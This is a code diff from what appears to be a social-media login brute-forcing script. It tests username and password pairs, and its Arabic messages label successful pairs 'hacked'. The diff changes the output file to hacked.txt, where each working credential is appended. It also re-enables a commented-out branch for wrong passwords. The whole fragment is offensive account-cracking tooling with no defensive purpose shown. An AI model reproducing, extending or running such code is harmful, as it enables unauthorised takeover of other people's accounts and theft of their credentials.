@@ -80,24 +80,24 @@ for password in password:
 
             if 'checkpoint_url' in r.text:
                 print((normal_color+'' + user + ' : ' + password + ' --> تم الاختراق  '))
-                with open('good.txt', 'a') as x:
+                with open('hacked.txt', 'a') as x:
                     x.write(user + ':' + password + '\n')
                     exit()					
             if 'userId' in r.text:
                 print((normal_color+'' + user + ' : ' + password + ' --> تم الاختراق  '))
-                with open('good.txt', 'a') as x:
+                with open('hacked.txt', 'a') as x:
                     x.write(user + ':' + password + '\n')
             if 'error' in r.text:
                 print((normal_color+'' + user + ' : ' + password + ' --> عذرا ، كانت هناك مشكلة في طلبك '))
-            """elif 'status' in r.text:
+            elif 'status' in r.text:
               print (end_banner_color + "---------------------------------------")
               print ((red_color + ' --> ' + user + ' : ' + password))
-              print ((red_color + ' --> Error '))
+              print ((red_color + ' --> كلمه المرور غير صحيحه '))
               x=(password)
               sleep(4)
               sys.stdout.write(f'\rplease wait ..')
               os.system([linux, windows][os.name == 'nt'])
-              print(r.text)"""
+              print(r.text)
 
    
 
